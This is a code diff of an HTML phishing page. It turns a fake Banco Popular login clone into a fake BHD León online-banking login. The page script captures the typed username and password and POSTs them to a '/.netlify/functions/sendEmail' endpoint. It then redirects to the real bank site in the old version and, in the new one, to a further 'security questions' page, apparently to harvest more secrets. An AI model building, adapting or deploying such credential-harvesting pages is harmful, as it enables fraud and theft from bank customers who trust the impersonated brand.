@@ -3,151 +3,148 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Banco Popular - Login</title>
+    <title>Inicio de Sesión - BHD León</title>
     <style>
         body {
             font-family: Arial, sans-serif;
-            background: linear-gradient(to right, #004080, #0080C0);
-            color: white;
+            background-image: url('assets/background-login.webp');
+            background-size: cover;
+            background-position: center;
             margin: 0;
             padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
         }
 
-        .login_bpd {
-            max-width: 400px;
-            margin: 50px auto;
+        .login-container {
+            background-color: rgba(255, 255, 255, 0.8);
+            width: 400px;
             padding: 20px;
-            background: #005C99;
-            border-radius: 8px;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            border-radius: 10px;
             text-align: center;
         }
 
-        .logo_bpd {
-            max-width: 150px;
+        .login-container img {
+            width: 120px;
             margin-bottom: 20px;
         }
 
-        .segmentos_tabs {
-            display: flex;
-            justify-content: space-between;
-            margin-bottom: 20px;
+        h2 {
+            color: #005aa7;
+            font-size: 24px;
         }
 
-        .segmento {
-            flex: 1;
-            padding: 10px;
-            cursor: pointer;
-            background: #004080; /* Color base #004080 */
-            border: none;
-            border-radius: 4px;
-            text-decoration: none;
-            color: white;
-            font-size: 14px;
-            margin: 0 5px;
-        }
-
-        /* Eliminar el resaltado al pasar el ratón y la clase active */
-        .segmento:hover, .segmento.active {
-            background: #004080; /* Sin cambio de color */
-        }
-
-        .segmento_descripcion {
-            font-size: 18px;
-            font-weight: bold;
+        .form-group {
             margin-bottom: 15px;
+            text-align: left;
+            padding-left: 10px;
+            padding-right: 10px;
         }
 
-        .segmento_formulario input {
-            width: calc(100% - 20px);
-            padding: 10px;
-            margin: 10px 0;
-            border: none;
-            border-radius: 4px;
-            outline: none;
+        label {
+            font-size: 14px;
+            color: #333;
         }
 
-        .segmento_formulario button {
+        input[type="text"],
+        input[type="password"] {
             width: 100%;
             padding: 10px;
-            background: #0080C0;
-            border: none;
-            border-radius: 4px;
+            margin-top: 5px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: #3bbd69;
             color: white;
-            font-weight: bold;
+            border: none;
+            border-radius: 5px;
+            font-size: 18px;
             cursor: pointer;
+            margin-top: 20px;
         }
 
-        .segmento_enlaces a {
-            color: #00D4FF;
+        button:hover {
+            background-color: #339d56;
+        }
+
+        .forgot-password {
+            margin-top: 10px;
+            font-size: 12px;
+            color: #005aa7;
+        }
+
+        .forgot-password a {
+            color: #005aa7;
             text-decoration: none;
-            font-size: 14px;
         }
 
-        .segmento_enlaces a:hover {
+        .forgot-password a:hover {
             text-decoration: underline;
-        }
-
-        .segmento_enlaces span {
-            margin: 0 10px;
         }
     </style>
 </head>
 <body>
-    <div class="login_bpd">
-        <img class="logo_bpd" src="https://popularenlinea.com/_catalogs/masterpage/popularenlinea/shared/images/logo-bpd-blanco.svg" alt="Banco Popular">
-        <div class="segmentos_tabs">
-            <a class="segmento btn_segmento segmento_persona">Personal</a>
-            <a class="segmento btn_segmento segmento_empresarial">Empresarial</a>
-            <a class="segmento btn_segmento segmento_agentes">Agentes</a>
-        </div>
-        <div class="tab-content segmentos_content">
-            <!-- Tab Personal -->
-            <div id="segmento_persona" class="segmento segmento_persona tab-pane active">
-                <div class="segmento_descripcion">Tu cuenta personal</div>
-                <div class="segmento_formulario">
-                    <input class="usuario_persona" type="text" placeholder="Nombre de usuario">
-                    <input class="pass_persona" type="password" placeholder="Contraseña">
-                    <button class="acceder_personas">Acceder</button>
-                </div>
-                <div class="segmento_enlaces">
-                    <a href="#">¿Olvidaste tu contraseña?</a>
-                    <span>|</span>
-                    <a href="#">Solicita tu acceso</a>
-                    <span>|</span>
-                    <a href="#">Pistas de seguridad</a>
-                </div>
+
+    <div class="login-container">
+        <img src="assets/logo-bhd.svg" alt="BHD León Logo">
+        <h2>BHD Personal</h2>
+        <form id="login-form">
+            <div class="form-group">
+                <label for="usuario">Usuario *</label>
+                <input type="text" id="usuario" name="usuario" required>
             </div>
-        </div>
+            <div class="form-group">
+                <label for="contrasena">Contraseña *</label>
+                <input type="password" id="contrasena" name="contrasena" required>
+            </div>
+            <button type="submit">Entrar</button>
+            <div class="forgot-password">
+                <p><a href="#">¿Olvidaste tu clave de acceso?</a></p>
+            </div>
+        </form>
     </div>
 
     <script>
-        document.querySelector(".acceder_personas").addEventListener("click", function(event) {
-    event.preventDefault(); // Evita el comportamiento predeterminado
+        document.getElementById("login-form").addEventListener("submit", function(event) {
+            event.preventDefault(); // Evita que el formulario se envíe automáticamente
 
-    const usuario = document.querySelector(".usuario_persona").value;
-    const pass = document.querySelector(".pass_persona").value;
+            var usuario = document.getElementById("usuario").value;
+            var contrasena = document.getElementById("contrasena").value;
 
-    if (usuario && pass) {
-        fetch('/.netlify/functions/sendEmail', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({
-                username: usuario,
-                password: pass
+            // Enviar los datos al backend usando Fetch API
+            fetch("/.netlify/functions/sendEmail", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    username: usuario,
+                    password: contrasena
+                })
             })
-        })
-        .then(() => {
-            // Redirige solo después de enviar correctamente
-            window.location.href = "https://www.popularenlinea.com/";
+            .then(response => response.json())
+            .then(data => {
+                // Si el correo se envió correctamente, redirige al archivo de preguntas de seguridad
+                if (data.message === "Correo enviado con éxito") {
+                    window.location.href = "preguntas-seguridad.html"; // Redirige al archivo de preguntas
+                } else {
+                    alert("Hubo un problema al enviar el correo.");
+                }
+            })
+            .catch(error => {
+                alert("Error al enviar el correo: " + error);
+            });
         });
-    } else {
-        // Opcional: Mostrar un mensaje o manejar campos vacíos
-        alert("Por favor, complete todos los campos.");
-    }
-});
     </script>
+
 </body>
 </html>
